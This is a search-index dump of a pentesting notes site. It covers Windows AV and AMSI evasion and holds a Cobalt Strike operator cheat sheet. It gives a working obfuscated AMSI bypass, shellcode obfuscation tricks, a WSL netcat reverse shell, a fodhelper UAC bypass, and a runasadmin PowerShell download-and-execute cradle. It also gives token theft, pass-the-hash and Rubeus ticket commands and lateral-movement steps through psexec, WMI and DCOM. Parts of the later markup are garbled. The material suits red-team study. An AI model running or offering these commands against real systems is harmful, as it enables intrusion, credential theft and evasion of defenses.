&lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre>"},{"location":"pentesting/Evasion/#lsass-protections","title":"LSASS Protections","text":""},{"location":"pentesting/Evasion/#credential-guard","title":"Credential Guard","text":""},{"location":"pentesting/Evasion/#check-if-credential-guard-is-configured","title":"Check if credential guard is configured","text":"<pre><code>if ((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured -match \"CredentialGuardA\") {return $true}else{return $false}\n</code></pre>"},{"location":"pentesting/Evasion/#check-if-credential-guard-is-running","title":"Check if credential guard is running","text":"<pre><code>if ((Get-ComputerInfo).DeviceGuardSecurityServicesRunning -match \"CredentialGuardA\") {return $true}else{return $false}\n</code></pre>"},{"location":"pentesting/Evasion/#runasppl","title":"RunasPPL","text":"<ul> <li>https://itm4n.github.io/lsass-runasppl/</li> </ul>"},{"location":"pentesting/Evasion/#check-if-runasppl-is-configured","title":"Check if RunasPPL is configured","text":"<pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL\n</code></pre>"},{"location":"pentesting/Evasion/#defeating-av","title":"Defeating AV","text":""},{"location":"pentesting/Evasion/#general_1","title":"General","text":"<ul> <li>EDR Hookdump https://github.com/zeroperil/HookDump</li> <li>Overview of methods: https://github.com/CMEPW/BypassAV</li> </ul>"},{"location":"pentesting/Evasion/#obfuscation-tools","title":"Obfuscation tools","text":""},{"location":"pentesting/Evasion/#c-binaries","title":"C# binaries","text":"<ul> <li>Obfuscate C# binary with https://github.com/mkaring/ConfuserEx</li> <li>Launch ConfuserEx</li> <li>In Project tab select the Base Directory where the binary file is located.</li> <li>In Project tab Select the Binary File that we want to obfuscate.</li> <li>In Settings tab add the rules.</li> <li>In Settings tab edit the rule and select the preset as <code>Normal</code>.</li> <li>In Protect tab click on the protect button.</li> <li>We will find the new obfuscated binary in the Confused folder under the Base Directory.</li> </ul>"},{"location":"pentesting/Evasion/#go-binaries","title":"Go binaries","text":"<ul> <li>https://github.com/burrowers/garble</li> </ul>"},{"location":"pentesting/Evasion/#powershell_1","title":"Powershell","text":"<ul> <li>https://github.com/danielbohannon/Invoke-Obfuscation</li> <li>https://github.com/JoelGMSec/Invoke-Stealth</li> <li>Remove comments with PowerStrip</li> </ul>"},{"location":"pentesting/Evasion/#evasion-techniques","title":"Evasion techniques","text":"<ul> <li>Most examples are in PowerShell but techniques can be implemented in every coding language</li> </ul>"},{"location":"pentesting/Evasion/#things-that-get-you-caught","title":"Things that get you caught","text":"<ul> <li>Using Templates; MSbuild template / scripts / etc</li> <li>Not changing variable &amp; function names</li> <li>Not removing comments</li> <li>Not obfuscating common code exec patterns</li> <li>Appplies to scripts, templates &amp; Compiled code</li> <li>Not changing error messages etc.</li> <li>Entropy</li> <li>Rougly - high entropy = more random</li> <li>Higher entropy = less compressible</li> <li>Problem: we encrypt shellcode to evade</li> <li>encrypted shellcode = more random -&gt; higher entropy</li> <li>Dont randomize all the things<ul> <li>Changing default variable/func. names is good, but random characters is bad. Use two-word pairs.</li> </ul> </li> </ul>"},{"location":"pentesting/Evasion/#how-amsi-evaluates-powershell-commands","title":"How amsi evaluates PowerShell commands","text":"<ul> <li>The code is evaluated when its readable by the scripting engine</li> <li>This is what allows us to still be able to obfuscate our code <pre><code># This\npowershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIASABlAGwAbABvACAAVwBvAHIAbABkACIAKQA=\n\n# Becomes\nWrite-Host(\"Hello World\")\n\n# But This\nWrite-Host(\"He\" + \"llo\" + \"World\")\n\n# Does not become\nWrite-Host(\"Hello World\")\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#change-the-following-in-scriptscode","title":"Change the following in scripts/code","text":""},{"location":"pentesting/Evasion/#hash-of-filecode","title":"Hash of file/code","text":"<ul> <li>Change Capitalization <ul> <li>PowerShell ignores capitalization, AMSI ignored capitalization, but changing your hash is best practice.<ul> <li><code>$variablename = \"amsicontext\"</code> to <code>$VaRiAbLeNaMe = \"amsicontext\"</code></li> </ul> </li> <li>C# is case sensitive, but changing the capitalization changes the hash. (Must change every entry of the variable!)</li> </ul> </li> <li>Remove comments<ul> <li>Remove all comments out of the script/code<ul> <li>https://powershell.one/isesteroids/quickstart/overview</li> <li>https://github.com/yoda66/PowerStrip</li> </ul> </li> </ul> </li> </ul>"},{"location":"pentesting/Evasion/#byte-strings","title":"Byte strings","text":"<ul> <li>Change variable names</li> <li><code>$variablename = \"amsicontext\"</code> to <code>$LoremIpsum = \"amsicontext\"</code></li> <li>Dont randomize all the things<ul> <li>Changing default variable/func. names is good, but random characters is bad. Use two-word pairs (Example: DragonBerrySmasher)</li> </ul> </li> <li>Concatenation</li> <li><code>\"amsicontext\"</code> to <code>\"am\" + \"si\" + \"con\" + \"te\" + \"xt\"</code></li> <li>Variable insertion</li> <li><code>$variablename = 'context'</code> into <code>$variablename2 = \"Amsi$variablename\"</code></li> <li>C# <code>string variablename = \"context\"; string variablename2 = $\"amsi{variablename}\";</code></li> <li>Format string<ul> <li><code>$variablename = \"amsi{0}text -f \"con\"</code></li> <li><code>$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",80);</code> to <code>$client = New-Object (\"{0}{1}\" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')(\"10.10.10.10\",80);</code></li> <li>C# <code>string variablename = \"context\"; string variablename2 = String.Format(\"amsi{0}\",variablename);</code></li> </ul> </li> <li>Potentially the order of execution</li> <li>Obfuscating shellcode</li> <li>Shellcode as UUID<ul> <li>https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py</li> </ul> </li> <li>Reverse shellcode bytes</li> <li>Break into chunks</li> <li>Divide code into two arrays - even &amp; odd bytes</li> <li>Steganography</li> <li><code>BigInteger() h/t</code></li> <li>Shellcode as english words<ul> <li>https://github.com/hardwaterhacker/jargon</li> </ul> </li> <li>Shellcode as Emoji<ul> <li>https://github.com/RischardV/emoji-shellcoding</li> </ul> </li> <li>Lower entropy</li> <li>Languages are not random</li> <li>Create an array with a dictionary and compile it with the code (disable compiler optimization)</li> <li>Misc</li> <li>PowerShell<ul> <li>Properties of an object<ul> <li>Can be obfuscated with backticks <code>$notify.icon</code> to <code>$notify.\"i`c`on\"</code></li> </ul> </li> </ul> </li> <li>C#<ul> <li>Changing the variable type (i.e list vs array) </li> <li>Rename your entrypoints<ul> <li>https://learn.microsoft.com/th-th/dotnet/framework/interop/specifying-an-entry-point#renaming-a-function-in-c-and-c\\ <pre><code>[DllImport(\"kernel32\")]\n    private static extern IntPtr VirtualAlloc(\n    UInt32 lpStartAddr, \n    UInt32 size, \n    UInt32 flAllocationType, \n    UInt32 flProtect);\n\n[DllImport(\"kernel32, EntryPoint = VirtualAlloc\",\n    SetLastError = false, ExactSpelling = true)]\n    private static extern IntPtr SplendidDragon(\n    UInt32 lpStartAddr, \n    UInt32 size, \n    UInt32 flAllocationType, \n    UInt32 flProtect);\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"pentesting/Evasion/#structure-of-the-code","title":"Structure of the code","text":"<ul> <li>Change methods and lines of code around. </li> </ul>"},{"location":"pentesting/Evasion/#example-of-changing-amsi-bypass-string","title":"Example of changing amsi bypass string","text":"<pre><code># Original amsi bypass\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# New\n$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v.\"Get`Fie`ld\"('ams' + 'iInitFailed','NonPublic,Static').\"Set`Val`ue\"($null,$true)\n</code></pre>"},{"location":"pentesting/Evasion/#defeating-microsoft-defender","title":"Defeating Microsoft Defender","text":"<ul> <li>Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck</li> <li>Run Threatcheck <code>.\\ThreatCheck.exe -f .\\shell.exe</code></li> <li>Replace string which gets detected.</li> <li>Recompile and check again!</li> <li>Also possible to use https://github.com/dobin/avred</li> </ul>"},{"location":"pentesting/Evasion/#scanning-amsi","title":"Scanning amsi","text":""},{"location":"pentesting/Evasion/#threatcheck","title":"Threatcheck","text":"<ul> <li>https://github.com/rasta-mouse/ThreatCheck <pre><code>.\\ThreatCheck.exe -f .\\shell.ps1 -e AMSI\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#amsitrigger","title":"AmsiTrigger","text":"<ul> <li>https://github.com/RythmStick/AMSITrigger <pre><code>.\\AmsiTrigger.exe -i .\\shell.ps1 -f 2\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#offensive-net","title":"Offensive .NET","text":"<ul> <li>https://github.com/Flangvik/NetLoader</li> <li>Load binary from filepath or URL and patch AMSI &amp; ETW while executing <pre><code>C:\\Users\\Public\\Loader.exe -path http://xx.xx.xx.xx/something.exe\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#use-custom-exe-assembyload-to-run-netloader-in-memory-and-then-load-binary","title":"Use custom exe Assembyload to run netloader in memory and then load binary","text":"<pre><code>C:\\Users\\Public\\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe\n</code></pre>"},{"location":"pentesting/Evasion/#random-notes","title":"Random notes","text":"<pre><code>pyinstaller.exe --onefile .\\CVE-2021-1675.py\npyarmor pack --clean -e \"--onefile \" .\\CVE-2021-1675.py\n</code></pre>"},{"location":"pentesting/Evasion/#windows-subsystem-for-linux-wsl","title":"Windows Subsystem for Linux WSL","text":"<ul> <li>AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.</li> <li>With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.</li> </ul>"},{"location":"pentesting/Evasion/#netcat-shell","title":"Netcat shell","text":"<pre><code>wsl.exe mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc &lt;IP&gt; &lt;PORT&gt; 1&gt;/tmp/backpipe\n</code></pre>"},{"location":"pentesting/Evasion/#bypass-whitelisting","title":"Bypass whitelisting","text":"<ul> <li>In both the above cases, the Windows application will have:   \u2013 Same permissions as the WSL process.    \u2013 Run as the current Windows user.   \u2013 Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL. <pre><code>bash.exe -c cmd.exe\nwsl.exe cmd.exe\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#privileges","title":"Privileges","text":""},{"location":"pentesting/Evasion/#check-current-privileges","title":"Check current privileges","text":"<pre><code>whoami /priv\n</code></pre>"},{"location":"pentesting/Evasion/#sedebugprivileges","title":"SeDebugPrivileges","text":"<ul> <li>http://woshub.com/obtain-sedebugprivilege-debug-program-policy-enabled/</li> </ul>"},{"location":"pentesting/Evasion/#export-the-current-user-rights-set-by-the-group-policies-to-a-text-file","title":"Export the current user rights set by the group policies to a text file:","text":"<pre><code>secedit /export /cfg secpolicy.inf /areas USER_RIGHTS\n</code></pre>"},{"location":"pentesting/Evasion/#edit-the-secpolicying","title":"Edit the secpolicy.ing","text":"<ul> <li>Change the SeDebugPrivileges to <code>S-1-5-32-544</code> the Local administrator group. <pre><code>notepad.exe secpolicy.inf\n</code></pre></li> <li>Or converts sids: http://woshub.com/convert-sid-to-username-and-vice-versa/</li> </ul>"},{"location":"pentesting/Evasion/#save-the-new-user-rights-set","title":"Save the new user rights set","text":"<pre><code>secedit /configure /db secedit.sdb /cfg secpolicy.inf /overwrite /areas USER_RIGHTS\n</code></pre>"},{"location":"pentesting/Evasion/#start-cmd-again","title":"Start cmd again","text":"<ul> <li>Check privileges with <code>whoami</code> if not having SeDebugPrivilege do <code>PsExec.exe -i cmd.exe</code></li> </ul>"},{"location":"pentesting/Evasion/#uac-bypass","title":"UAC bypass","text":"<ul> <li>A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.</li> <li>Tool: https://github.com/hfiref0x/UACME</li> <li>Guide on how to build: https://ad-lab.gitbook.io/building-a-windows-ad-lab/vulnerabilities-and-misconfigurations-and-attacks/misc/page-3-4</li> </ul> <pre><code>.\\Akagi64.exe &lt;METHOD&gt; &lt;EXECUTABLE&gt;\n.\\Akagi64.exe 34 cmd.exe\n</code></pre>"},{"location":"pentesting/Evasion/#automatec-uac-bypass-powershell-script","title":"Automatec UAC bypass PowerShell script","text":"<ul> <li>https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass</li> </ul> <pre><code>.\\Win-Multi-UAC-Bypass.ps1\n</code></pre>"},{"location":"pentesting/Evasion/#manual-uac-bypass","title":"Manual UAC bypass","text":"<ul> <li>https://atomicredteam.io/defense-evasion/T1548.002/</li> </ul>"},{"location":"pentesting/Evasion/#fodhelper","title":"Fodhelper","text":"<ul> <li>Can also use <code>C:\\Windows\\System32\\cmd.exe /c powershell.exe</code> <pre><code>New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"&lt;PATH TO EXE&gt;\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n\n# Cleanup\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\n</code></pre></li> </ul>"},{"location":"pentesting/Evasion/#check-current-uac-configuration","title":"Check current UAC configuration","text":"<ul> <li>The default configuration for UAC is Prompt for consent for non-Windows binaries, but can also have different settings such as Prompt for credentials, Prompt for consent and Elevate without prompting. <pre><code>Seatbelt.exe uac\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/","title":"Cobalt-Strike cheatsheet.","text":""},{"location":"pentesting/cobalt/#general","title":"General","text":""},{"location":"pentesting/cobalt/#get-current-user","title":"Get current user","text":"<pre><code>getuid\n</code></pre>"},{"location":"pentesting/cobalt/#change-sleep-set-interactive","title":"Change sleep / Set interactive","text":"<ul> <li>OPSEC Lower sleep = More traffic/Noice = More likely to get caught. <pre><code>sleep &lt;SECONDS&gt;\nsleep 0\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#get-metadata-from-beacon","title":"Get metadata from beacon","text":"<pre><code>checkin\n</code></pre>"},{"location":"pentesting/cobalt/#kill-a-beacon","title":"Kill a beacon","text":"<ul> <li>Right click beacon, then Session --&gt; Exit, then Session --&gt; Eemove</li> </ul>"},{"location":"pentesting/cobalt/#upload-and-download-files","title":"Upload and download files","text":"<pre><code>upload &lt;FILE&gt;\ndownload &lt;FILE&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#take-screenshots","title":"Take screenshots","text":"<ul> <li>View screenshot. Go to View -&gt; Screenshots <pre><code>printscreen               Take a single screenshot via PrintScr method\nscreenshot                Take a single screenshot\nscreenwatch               Take periodic screenshots of desktop\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#keylogger","title":"Keylogger","text":"<pre><code>keylogger\n</code></pre>"},{"location":"pentesting/cobalt/#webserver","title":"Webserver","text":""},{"location":"pentesting/cobalt/#upload-file","title":"Upload file","text":"<ul> <li>Go to Site Management -&gt; Host File and select your document.</li> <li>Set the Location URI, Local Host and click Launch.</li> </ul>"},{"location":"pentesting/cobalt/#check-web-logs","title":"Check web logs","text":"<ul> <li>Go to View -&gt; Web log</li> </ul>"},{"location":"pentesting/cobalt/#teamserver","title":"Teamserver","text":""},{"location":"pentesting/cobalt/#start-teamserver","title":"Start teamserver","text":"<pre><code>cd /opt/cobaltstrike\nsudo ./teamserver &lt;IP&gt; &lt;PASSWORD&gt; &lt;C2 PROFILE&gt;\n\nsudo ./teamserver &lt;IP&gt; &lt;PASSWORD&gt; c2-profiles/normal/webbug.profile\n</code></pre>"},{"location":"pentesting/cobalt/#teamserver-service","title":"Teamserver service","text":""},{"location":"pentesting/cobalt/#create-service","title":"Create service","text":"<pre><code>sudo vim /etc/systemd/system/csteamserver.service\n\n[Unit]\nDescription=Cobalt Strike Team Server\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nWorkingDirectory=/home/attacker/cobaltstrike\nExecStart=/home/attacker/cobaltstrike/teamserver &lt;IP&gt; &lt;PASSWORD&gt; &lt;C2 PROFILE&gt;\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"pentesting/cobalt/#reload-service","title":"Reload service","text":"<pre><code>sudo systemctl daemon-reload\nsudo systemctl status csteamserver.service\n</code></pre>"},{"location":"pentesting/cobalt/#start-service","title":"Start service","text":"<pre><code>sudo systemctl start csteamserver.service\nsudo systemctl status csteamserver.service\n</code></pre>"},{"location":"pentesting/cobalt/#enable-service","title":"Enable service","text":"<pre><code>sudo systemctl enable teamserver.service\n</code></pre>"},{"location":"pentesting/cobalt/#persistend-hosted-files","title":"Persistend hosted files","text":"<ul> <li>Hosted files are gone on restart. A solution is to use <code>agscript</code> utility with the <code>artifact_payload</code> and <code>site_host</code> functions. <pre><code>agscript &lt;HOST&gt; &lt;PORT&gt; &lt;USER&gt; &lt;PASSWORD&gt; &lt;path/to/script.cna&gt;\n\nvim host_payloads.cna\n\n# Connected and ready\non ready {\n\n    # Generate payload\n    $payload = artifact_payload(\"&lt;LISTENER NAME&gt;\", \"&lt;PAYLOAD TYPE&gt;\", \"&lt;PAYLOAD ARCHITECTURE&gt;\");\n\n    # Host payload\n    site_host(\"&lt;LOCAL IP&gt;\", &lt;PORT&gt;, \"&lt;URI&gt;\", $payload, \"&lt;MIME TYPE&gt;\", \"&lt;DESCRIPTION&gt;\", &lt;HTTPS [true|false]&gt;);\n}\n</code></pre></li> </ul> <pre><code>vim host_payloads.cna\n\n# Connected and ready\non ready {\n\n    # Generate payload\n    $payload = artifact_payload(\"http\", \"powershell\", \"x64\");\n\n    # Host payload\n    site_host(\"10.10.5.50\", 80, \"/a\", $payload, \"text/plain\", \"Auto Web Delivery (PowerShell)\", false);\n}\n</code></pre>"},{"location":"pentesting/cobalt/#add-to-startup-service","title":"Add to startup service","text":"<ul> <li>Add the following line <pre><code>sudo vim /etc/systemd/system/csteamserver.service\n\nExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &amp;'\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#listeners","title":"Listeners","text":""},{"location":"pentesting/cobalt/#create-a-listener","title":"Create a listener","text":"<ul> <li>Two type of listeners: <code>egress</code> (HTTP(S) and DNS) and <code>peer-to-peer</code> (SMB or TCP).</li> <li><code>egress</code> listens on the teamserver IP.</li> <li><code>peer-to-peer</code> listens on a existing beacon.    </li> <li>In the menu click the HeadPhones Icon or click Cobalt Strike --&gt; Listeners </li> <li>Click the Add button at the bottom and and a new listener dialogue will appear.</li> <li>Choose a descriptive name such as <code>&lt;protocol&gt;-&lt;port&gt;</code> example: <code>http-80</code>.</li> <li>Set the variables/settings and click Save.</li> <li>Creating a TCP local listener is usefull for privescing or spawning new shells</li> </ul>"},{"location":"pentesting/cobalt/#create-peer-to-peer-listener","title":"Create peer-to-peer listener","text":"<ul> <li>Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.</li> <li>Then create payload for the new listener!</li> </ul>"},{"location":"pentesting/cobalt/#create-pivot-listener","title":"Create pivot listener","text":"<ul> <li>To start a Pivot Listener on an existing Beacon, right-click Pivoting --&gt; Listener.</li> <li>Might need to open port on the firewall</li> </ul>"},{"location":"pentesting/cobalt/#connect-to-pivot-listener","title":"Connect to pivot listener","text":"<ul> <li>Works like a bind shell. Most used are SMB or TCP.</li> <li>Run the payload on the target</li> <li>Connect to the beacon with <code>link</code> for smb and <code>connect</code> for tcp. <pre><code>connect &lt;IP&gt; &lt;PORT&gt;\nlink &lt;IP&gt; &lt;PIPE&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#opsec-listeners","title":"OPSEC listeners","text":"<ul> <li>DNS: Since 0.0.0.0 is the default response (and also rather nonsensical), Cobalt Strike team servers can be fingerprinted in this way.  This can be changed in the Malleable C2 profile.</li> <li>SMB: The default pipe name(<code>msagent_XX</code>) is quite well signatured. A good strategy is to emulate names known to be used by common applications or Windows itself.  Use <code>ls \\\\.\\pipe\\</code> to list all currently listening pipes for inspiration.  </li> </ul>"},{"location":"pentesting/cobalt/#payloads","title":"Payloads","text":""},{"location":"pentesting/cobalt/#create-payloads","title":"Create payloads","text":"<ul> <li>Click Payloads --&gt; Select an option or all</li> </ul>"},{"location":"pentesting/cobalt/#powershell-payload","title":"Powershell payload","text":"<ul> <li>Click Attacks --&gt; Scripted web delivery (S) --&gt; Choose a URI path, listener and select type PowerShell IEX</li> </ul>"},{"location":"pentesting/cobalt/#create-dll-payload","title":"Create dll payload","text":"<ul> <li>Bypasses default applocker configuration <pre><code>C:\\Windows\\System32\\rundll32.exe C:\\Users\\Administrator\\Desktop\\beacon.dll,StartW\nlink &lt;COMPUTERNAME&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#create-service-binary","title":"Create service binary","text":"<ul> <li>Used for privilege escalation with services</li> <li>Attacks --&gt; Packages --&gt; Windows Executable (S) and selecting the Service Binary output type.</li> <li>TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations</li> </ul>"},{"location":"pentesting/cobalt/#opsec-payloads","title":"OPSEC payloads","text":"<ul> <li>Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.</li> <li>The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.</li> </ul>"},{"location":"pentesting/cobalt/#command-execution","title":"Command Execution","text":""},{"location":"pentesting/cobalt/#execute-cmd-command","title":"Execute cmd command","text":"<pre><code>run &lt;COMMAND&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#execute-powershell-command","title":"Execute PowerShell command","text":"<pre><code>powershell &lt;COMMAND&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#execute-powershell-command-through-powerpick","title":"Execute PowerShell command through powerpick","text":"<ul> <li>Bypasses Constrained Language Mode <pre><code>powerpick $ExecutionContext.SessionState.LanguageMode\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#execute-assembly-in-memory","title":"Execute assembly in memory","text":"<pre><code>execute-assembly &lt;PATH TO EXE&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#load-powershell-script","title":"Load PowerShell script","text":"<pre><code>powershell-import &lt;FILE&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#uac-bypass","title":"UAC Bypass","text":"<ul> <li>https://github.com/cobalt-strike/ElevateKit</li> </ul>"},{"location":"pentesting/cobalt/#uac-bypass_1","title":"UAC bypass","text":"<ul> <li>Typing <code>elevate</code> and then tab lets you cycle through the methods. <pre><code>elevate &lt;METHOD&gt; &lt;LISTENER&gt;\nelevate uac-schtasks tcp-local\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#uac-bypass-method-2-runasadmin","title":"UAC bypass method 2 runasadmin","text":"<pre><code>runasadmin uac-cmstplua powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))\"\nconnect localhost 4444\n</code></pre>"},{"location":"pentesting/cobalt/#lateral-movement","title":"Lateral Movement","text":""},{"location":"pentesting/cobalt/#portscan","title":"Portscan","text":"<pre><code>portscan &lt;IP OR RANGE&gt; &lt;PORTS&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#user-impersonation","title":"User impersonation","text":""},{"location":"pentesting/cobalt/#make-token-runas-other-user","title":"Make token - runas other user","text":"<pre><code>make_token &lt;DOMAIN&gt;\\&lt;USER&gt; &lt;PASSWORD&gt;\n</code></pre>"},{"location":"pentesting/cobalt/#rev2self","title":"Rev2self","text":"<ul> <li>Drops impersonation and will undo the make token <pre><code>rev2self\n</code></pre></li> </ul>"},{"location":"pentesting/cobalt/#steal-token","title":"Steal token","text":"<ul> <li>If a user is running a process on the system, we can steal its process <pre><code>steal_token &lt;PID&gt;\n````\n\n#### Inject payload into process\n</code></pre> inject  <pre><code>#### Spawnas\n- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.\n- Must be run from a folder the user has access to.\n- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.\n</code></pre> make_token \\  spawnas \\ <pre><code>#### Pass the hash\n</code></pre> pth \\ <pre><code>\n</code></pre> mimikatz sekurlsa::pth /user: /domain: /ntlm: /run:\"powershell -w hidden\" steal_token  <pre><code>#### Pass the ticket\n- OPSEC: By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The \"Suspicious Logon Events\" saved search will show 4624's where the TargetOutboundDomainName is not an expected value.\n</code></pre> execute-assembly Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain: /username: /password:FakePass123 <p>execute-assembly Rubeus.exe ptt /luid: /ticket: <p>steal_token  <pre><code>#### Overpass the hash\n- OPSEC: Use AES256 keys\n</code></pre> execute-assembly Rubeus.exe asktgt /user: /domain: /rc4: /nowrap execute-assembly Rubeus.exe asktgt /user: /domain: /aes256: /nowrap /opsec <p>make_token \\ DummyPass <p>kerberos_ticket_use C:\\Users\\public\\ticket.kirbi</p> <p>ls \\\\c$ <pre><code>#### Overpass the hash elevated context\n</code></pre> execute-assembly Rubeus.exe asktgt /user: /domain: /aes256: /nowrap /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe"},{"location":"pentesting/cobalt/#output-processid","title":"output: [+] ProcessID       :  <p>steal_token  <p>ls \\\\c$ <pre><code>#### Extract and inject ticket, then steal token\n- Extract tickets of a user, create new process, inject ticket into process, steal token from the process\n</code></pre> execute-assembly Rubeus.exe triage execute-assembly Rubeus.exe dump /service:krbtgt /luid: /nowrap execute-assembly Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe execute-assembly Rubeus.exe ptt /luid: /ticket:[...base64-ticket...] steal_token  <pre><code>#### Load TGT or TGS ticket\n</code></pre> kerberos_ticket_use  <pre><code>#### Use ccache file\n</code></pre> kerberos_ccache_use <pre><code>### Techniques\n#### Jump\n</code></pre> jump [method] [target] [listener] <pre><code>Exploit                   Arch  Description\n-------                   ----  -----------\npsexec                    x86   Use a service to run a Service EXE artifact\npsexec64                  x64   Use a service to run a Service EXE artifact\npsexec_psh                x86   Use a service to run a PowerShell one-liner\nwinrm                     x86   Run a PowerShell script via WinRM\nwinrm64                   x64   Run a PowerShell script via WinRM\n</code></pre> <p>``` </p>","text":""},{"location":"pentesting/cobalt/#remote-exec","title":"Remote-exec","text":"<p>``` remote-exec [method] [target] [command]</p> <pre><code>psexec                          Remote execute via Service Control Manager\nwinrm                           Remote execute via WinRM (PowerShell)\nwmi                             Remote execute via WMI\n</code></pre> <p>``` </p>"},{"location":"pentesting/cobalt/#custom","title":"Custom","text":"<ul> <li>Use primitives such as <code>powershell</code>, <code>execute-assembly</code>, etc to implement something custom with for example an agressor script. </li> </ul>"},{"location":"pentesting/cobalt/#getting-the-architecture","title":"Getting the architecture","text":"<ul> <li>for winrm or winrm64 with jump <code>remote-exec winrm &lt;HOSTNAME&gt; (Get-WmiObject Win32_OperatingSystem).OSArchitecture</code> </li> </ul>"},{"location":"pentesting/cobalt/#jump-winrm","title":"Jump winrm","text":"<p><code>jump winrm64 &lt;HOSTNAME&gt; &lt;LISTENER&gt;</code> </p>"},{"location":"pentesting/cobalt/#jump-psexec","title":"Jump PSexec","text":"<p><code>jump psexec64 &lt;HOSTNAME&gt; &lt;LISTENER&gt;</code> </p>"},{"location":"pentesting/cobalt/#wmi","title":"WMI","text":"<ul> <li>Not a jump command but can be used manually</li> <li>Make sure the firewall is open for the ports used! <code>cd \\\\&lt;HOSTNAME&gt;\\ADMIN$ upload &lt;SMB BEACON EXE&gt; remote-exec wmi &lt;HOSTNAME&gt; &lt;BEACON EXE&gt; link &lt;HOSTNAME&gt; &lt;PIPE&gt;</code> <code>cd \\\\&lt;HOSTNAME&gt;\\ADMIN$ upload &lt;TCP BEACON EXE&gt; remote-exec wmi &lt;HOSTNAME&gt; &lt;BEACON EXE&gt; connect &lt;HOSTNAME&gt; &lt;PORT&gt;</code> </li> </ul>"},{"location":"pentesting/cobalt/#wmi-exec-commands","title":"WMI exec commands","text":"<p><code>remote-exec winrm &lt;HOSTNAME&gt; whoami; hostname</code> </p>"},{"location":"pentesting/cobalt/#coinitializesecurity","title":"CoInitializeSecurity","text":"<ul> <li>Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process. The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say \"User A\", then future BOFs may not be able to inherit a different security context (\"User B\") for the lifetime of the Beacon process.</li> <li>if CoInitializeSecurity has already been called, WMI fails with access denied.</li> <li>As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.  <code>remote-exec wmi &lt;HOSTNAME&gt; calc.exe execute-assembly SharpWMI.exe action=exec computername=&lt;HOSTNAME&gt; command=\"C:\\Windows\\System32\\calc.exe\"</code> </li> </ul>"},{"location":"pentesting/cobalt/#dcom","title":"DCOM","text":"<ul> <li>https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1 <code>powershell-import Invoke-DCOM.ps1 powershell Invoke-DCOM -ComputerName &lt;HOSTNAME&gt; -Method MMC20.Application -Command &lt;BEACON EXE&gt;</code> </li> 